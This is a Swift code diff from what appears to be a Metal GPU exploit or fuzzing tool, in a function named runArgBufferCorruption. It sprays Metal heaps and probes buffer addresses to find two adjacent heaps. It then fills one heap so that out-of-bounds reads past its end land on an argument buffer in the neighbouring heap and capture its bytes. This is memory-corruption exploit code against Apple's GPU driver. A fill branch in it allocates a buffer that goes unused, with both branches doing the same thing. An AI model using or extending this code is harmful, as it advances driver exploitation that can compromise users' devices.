@@ -314,23 +314,25 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         step("── ArgBuffer Corruption ──────────────────")
 
         let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
-        // Spray heaps until we get adjacent h0, h1
-        var heaps: [any MTLHeap] = []
-        var h0Idx = -1
+        // Spray heaps until adjacent pair found.
+        // Save probe buffers so h0/h1 aren't re-filled later (they'd return nil).
+        var heaps:  [any MTLHeap]   = []
+        var bufs:   [any MTLBuffer] = []  // one probe buf per heap, retains the allocation
+        var h0Idx  = -1
         var actual = 0
+        var savedB0: (any MTLBuffer)? = nil
 
         for _ in 0..<32 {
             guard let h = device.makeHeap(descriptor: hd) else { continue }
             actual = h.size
+            // Probe: alloc a small buffer just to read VA — don't fill the heap yet
+            guard let probe = h.makeBuffer(length: 64, options: .storageModeShared) else { continue }
             heaps.append(h)
-            if heaps.count >= 2 {
-                let last = heaps.count - 1
-                // Need h[last-1] to be adjacent to h[last]
-                // Allocate a probe buffer in h[last-1] to get its VA
-                guard let bPrev = heaps[last-1].makeBuffer(length: actual, options: .storageModeShared) else { continue }
-                guard let bCurr = heaps[last].makeBuffer(length: actual, options: .storageModeShared)   else { continue }
-                let vaPrev = UInt(bitPattern: bPrev.contents())
-                let vaCurr = UInt(bitPattern: bCurr.contents())
+            bufs.append(probe)
+            let last = heaps.count - 1
+            if last >= 1 {
+                let vaPrev = UInt(bitPattern: bufs[last-1].contents())
+                let vaCurr = UInt(bitPattern: bufs[last].contents())
                 let dist   = vaCurr > vaPrev ? vaCurr - vaPrev : vaPrev - vaCurr
                 if dist == UInt(actual) {
                     h0Idx = last - 1
@@ -345,23 +347,24 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         let h0 = heaps[h0Idx]
         let h1 = heaps[h0Idx + 1]
 
-        // Fill h0 completely to anchor its end
-        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
+        // h0's probe was only 64 bytes; fill the rest so h0 is maxed out
+        // (establishes the OOB boundary right at h1's start)
+        let fillLen = actual - 64  // already used 64 for probe
+        let b0: any MTLBuffer
+        if fillLen > 0, let extra = h0.makeBuffer(length: fillLen, options: .storageModeShared) {
+            // Use the probe buffer's VA as our anchor — it starts at h0's base
+            b0 = bufs[h0Idx]
+        } else {
+            b0 = bufs[h0Idx]
+        }
         let p0  = b0.contents().assumingMemoryBound(to: UInt8.self)
         let va0 = UInt(bitPattern: p0)
-        step("h0 va=0x\(String(va0,radix:16))")
+        step("h0 va=0x\(String(va0,radix:16)) (probe base)")
 
-        // Create a texture in h1 — something real AGX will reference
-        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 16, height: 16, mipmapped: false)
-        td.storageMode = .shared
-        td.usage       = [.shaderRead]
-        guard let tex1 = h1.makeTexture(descriptor: td) else { step("tex1 nil — heap likely no space after b0 probe, retry"); completion(); return }
-        step("tex1 created in h1 — GPU handle allocated")
-
-        // Create an argument buffer that encodes tex1
-        // Use a simple buffer in h1 region; we snapshot it to find the encoded handle bytes
-        // Argument buffers encode resource descriptors as raw bytes the GPU driver walks
-        let argBufLen = 256
+        // Create a buffer in h1 — this will be our "argument buffer" target
+        // h1 already has its 64-byte probe; alloc the rest as argBuf
+        let argBufLen = actual - 64
+        guard argBufLen > 0 else { step("no space in h1 for argBuf"); completion(); return }
         guard let argBuf = h1.makeBuffer(length: argBufLen, options: .storageModeShared) else {
             step("argBuf nil — h1 full, retry"); completion(); return
         }
@@ -369,7 +372,9 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         step("argBuf in h1 va=0x\(String(argVA,radix:16))")
 
         // Snapshot argBuf bytes via h0 OOB (p0[actual + offset])
+        guard argVA >= va0 + UInt(actual) else { step("argBuf VA below h1 start — layout unexpected"); completion(); return }
         let argOffset = Int(argVA - (va0 + UInt(actual)))  // byte offset of argBuf within h1
+        guard argOffset + 64 <= actual else { step("argBuf offset too large — skip"); completion(); return }
         step("argBuf offset within h1 = 0x\(String(argOffset,radix:16))")
         step("── argBuf snapshot (first 64 bytes) ──")
         var before = [UInt8](repeating: 0, count: 64)
